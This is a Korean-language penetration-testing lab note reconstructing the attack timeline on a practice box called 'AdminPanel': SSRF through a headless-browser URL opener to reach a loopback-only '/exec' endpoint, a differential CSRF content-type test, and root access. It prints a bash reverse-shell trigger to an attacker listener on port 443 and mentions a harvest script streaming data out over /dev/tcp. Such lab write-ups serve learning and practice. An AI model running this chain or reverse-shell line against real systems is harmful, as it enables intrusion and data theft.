# AdminPanel — 노트 신규 작성 기록

박스 정지 상태에서 산출물만으로 신규 작성. `writeup_notes.txt` 부재 — 시행착오는 Kali `~/PG/AdminPanel/` 파일 mtime, 살아있는 tmux 세션(`ap-web80`·`ap-rev443`·`ap-rx`) capture-pane, 볼트 스크린샷으로 복원.

## 타임라인 (mtime 재구성)

| 시각(KST) | 사건 |
|---|---|
| 14:37:03 | recon 프리플라이트 시작 |
| 14:37:20~14:37:55 | nmap quick/full, gobuster, 웹 프로빙 |
| 14:39:00 | Kali `/tmp/apwww` 웹서버(tmux `ap-web80`) 기동 |
| 14:39:15~14:39:36 | `payload_1~15`(초기 라운드) + `pl1.txt`/`b_00~17`(스킴·내부포트 라운드) — `/open-url` SSRF 확정 |
| 14:40:16 | `routes.txt`/`routefuzz.txt` — 41개 후보 라우트 프로빙, `/exec` 특정 |
| 14:40:58 | `exec/` 디렉터리 생성(현재까지 빈 채로 잔존) |
| 14:41:14 | Kali `/tmp/e.out` — 외부 IP 로 `/exec` 직접 POST, `{"error":"Access denied"}` (게이트 확인) |
| 14:41:56 | `/tmp/apwww/x.html` — 5기법(A~E) 차등 CSRF 테스트 페이지 |
| 14:42:05 | 타겟이 `x.html` 로드, `ap-web80` 로그에 `HIT-B-command`·`HIT-D-command` 만 도달 |
| 14:42:27 | `/tmp/apwww/r.html` — 최종 트리거(쿼리스트링 `c` → `/exec`) |
| 14:42:35 | tmux `ap-rev443`(443 리스너) 기동 |
| 14:42:45 | `/open-url` → `r.html?c=bash -c "bash -i >&/dev/tcp/45.247/443 0>&1"` 트리거, 리버스셸 연결 |
| 14:43:40 | `/tmp/apwww/harvest.sh` 배치(타겟에서 curl 로 받게 하려는 사본) |
| 14:43:58 | `proof_root.txt` 생성 |
| 14:44:19 | `app_source_capture.txt`(`cat /app/*.js`) |
| 14:45:08~14:45:33 | harvest 실행, `/dev/tcp` 스트리밍 회수(tmux `ap-rx`) |

## 지시 대비 반증

1. **경로 수 46개 → 실측 41개.** `routes.txt`/`routefuzz.txt` 모두 `wc -l` 41. 지시문의 "46개"는 오기.
2. **`/exec` 원문 미보존 — 부분 반증.** `~/PG/AdminPanel/exec/` 디렉터리 자체는 비어 있어 지시대로 원문 파일은 없음. 그러나 박스 정지 후에도 Kali 쪽 tmux 세션(`ap-web80`·`ap-rev443`)이 살아 있어 `capture-pane -p`로 요청 도달 로그와 후속 root 셸 세션을 실측 복원. 즉 "원문 미보존"은 파일 단위로는 사실이나 "시행착오 복원 불가"는 아님.
3. **`writeup_notes.txt` 부재로 인한 "복원 불가" 전제도 과했다.** 실제로는 mtime 재구성 + 살아있는 tmux capture-pane 조합으로 SSRF 스킴 우회 시도(18종)·내부 포트 스윕(6개)·5기법 차등 CSRF 테스트·최종 트리거까지 전 구간이 시간순으로 복원됨.
4. **컨테이너 여부 — 산출물 기준 확정 가능.** 지시는 "판정 서면 적고 안 서면 관측 없음"이었으나, PID 1이 `/sbin/init`(harvest.txt PROCS), 루트가 LVM `ubuntu--vg-ubuntu--lv` ext4, snapd squashfs 마운트 3종(chromium/cups/core22), 물리 NIC `ens192` — 넷 다 컨테이너에서는 통상 보이지 않는 신호라 "컨테이너 아님(VM)"으로 확정 판정. `hostname`이 `localhost`이고 앱 작업 디렉터리가 `/app`인 것은 배포 관례일 뿐, 컨테이너 근거가 아님.

## 박스 노트에서 뺀 시행착오 — `_PLAYBOOK` 이관 후보

아래는 박스 노트(OSCP 제출 형식)에는 넣지 않고 여기 원문 그대로 보존. `_PLAYBOOK.md`는 직접 열지 않았음 — 관리자가 반영.

### 후보 1 — 증상별(A절 추정): "SSRF로 연 헤드리스 브라우저가 IP 화이트리스트를 무력화한다"

**증상**: 내부 전용(루프백 화이트리스트) 엔드포인트가 있는데, 별도로 임의 URL을 서버측에서 "열어보는" 기능(`/open-url`류)이 같은 앱에 존재.

**원인**: 그 기능이 단순 `fetch`가 아니라 헤드리스 브라우저(puppeteer/playwright 등)를 띄워 페이지를 렌더링하는 구현이면, 그 브라우저 프로세스는 앱 서버와 같은 호스트에서 뜨므로 자신에게 보내는 모든 요청이 "루프백에서 발신"으로 잡힌다. 소스 IP 기반 인증(게이트)이 이 시나리오에서 전부 뚫린다.

**해야 할 일**: 임의 URL을 서버 프로세스가 렌더링/요청하는 기능이 보이면, 그 자체를 SSRF로 보는 동시에 "이 서버가 자기 자신에게 요청을 보낼 수 있는가"부터 확인 — 같은 호스트의 다른 포트(특히 `127.0.0.1` 전용 관리 엔드포인트)를 스윕.

**실측 근거**: AdminPanel `/open-url`(puppeteer) → `/exec`(127.0.0.1/::1 화이트리스트). `~/PG/AdminPanel/openurl/pl1.txt` + `b_00~17.json`, `app_source_capture.txt`.

### 후보 2 — 기법 카드(B절 추정): "Content-Type/CORS 프리플라이트 차등 테스트로 blind 요청의 성공 조합 찾기"

**상황**: 목표 엔드포인트에 직접 응답을 읽을 수 없는 크로스오리진 blind POST(SSRF로 연 브라우저의 JS 실행, 또는 순수 CSRF)만 가능하고, 서버가 어떤 `Content-Type`/필드명을 받는지 모를 때.

**기법**: 후보 필드명을 여러 개 나열하고, 각 후보 조합(A: `text/plain`+JSON 문자열, B: `no-cors` fetch + `urlencoded`, C: `text/plain` form(JSON 스머글링), D: `urlencoded` form, E: `application/json`+CORS)마다 서로 다른 콜백 URL(`/HIT-<기법>-<필드명>`)을 심어 공격자 리스너로 동시에 발사. 리스너 로그에 찍힌 콜백만 보고 어느 조합이 실제로 서버에 도달·파싱됐는지 역산.

**원리**: `application/json`·커스텀 헤더가 있는 요청은 CORS 프리플라이트(OPTIONS)가 필요하고, 서버가 CORS 헤더를 안 주면 브라우저가 실제 요청 자체를 안 보낸다. `text/plain`은 프리플라이트는 없지만 대부분의 body-parser가 `Content-Type: application/json`을 명시하지 않으면 파싱하지 않는다. 결과적으로 프리플라이트 없이 발사되면서 서버가 실제로 파싱하는 조합(보통 `application/x-www-form-urlencoded`)만 성공한다.

**실측 근거**: AdminPanel `/tmp/apwww/x.html`(5기법 동시 발사) — `ap-web80` 로그에 `HIT-B-command`·`HIT-D-command`만 도달, 나머지 3개 콜백 부재.

### 후보 3 — 증상별: "SSRF 로 연 헤드리스 브라우저는 자체 unsafe-port 목록에 걸린다"

**증상**: SSRF로 내부 포트를 스캔하는데 특정 포트(22 등)만 유독 `ERR_UNSAFE_PORT`로 실패.

**원인**: 서버 자체가 아니라 그 SSRF를 수행하는 브라우저 엔진(Chromium 등)이 자체적으로 위험 포트 목록(25/tcp SMTP, 22/tcp SSH 등)을 하드코딩해 차단한다. 방화벽·서비스 부재가 아니라 브라우저 레벨 차단이므로, 순수 `fetch`/`curl` 기반 SSRF라면 이 제한이 없을 수 있다.

**실측 근거**: `~/PG/AdminPanel/openurl/payload_15.txt`(`http://127.0.0.1:22/`) → `resp_15.json`: `net::ERR_UNSAFE_PORT`.

### 후보 4 — 방법론(D/E절 추정): "exec/가 비어 있어도 살아있는 tmux 세션으로 복원 가능"

박스가 이미 정지돼도 Kali 공격 호스트의 tmux 세션은 별개로 살아있다. `tmux ls`로 이 박스 작업 시간대에 만든 세션(이름 규칙이 있으면 더 쉽다 — 이 박스는 `ap-*` 접두사)을 찾아 `capture-pane -p -S -200`로 스크롤백을 읽으면, 저장 파일로 남기지 않은 리스너 로그·중간 명령까지 복원된다. **`find /`·전수 grep 없이, 그 박스 작업 시간대로 bounded 한 조회**(`find /tmp -newer <해당 시각 파일>`)로 충분했다 — 새로 뒤진 게 아니라 이미 있던 산출물과 세션을 시간 순으로 이었을 뿐.

## 남은 원문 미보존 — 확정

- `/open-url` → `r.html` 최종 트리거 POST 자체(요청 바디) — 저장 파일 없음. 효과(공격자 서버 `GET /r.html` 로그 + 타겟 리버스셸 연결)로만 확인.
- `/exec` 각 호출의 정확한 요청·응답 바디 — `exec/` 디렉터리 빈 채로 확정. 성공 여부는 콜백 로그·최종 리버스셸로만 확인.
- `/proc/1/cgroup`·`.dockerenv` 자체 캡처 — harvest.sh 가 이 두 항목을 별도로 뜨지 않음. 컨테이너 판정은 PID 1·마운트·NIC 세 근거로 대체.

## 프론트매터

`manual_tags: true` 선언, 실사용 3기법(`ssrf`·`csrf`·`rce`)만 태깅. `csrf` 태그는 볼트 전체에서 이 노트가 최초 사용 — 기존 taxonomy에 부재 확인(`tech/*csrf*` 전수 grep 결과 0건).
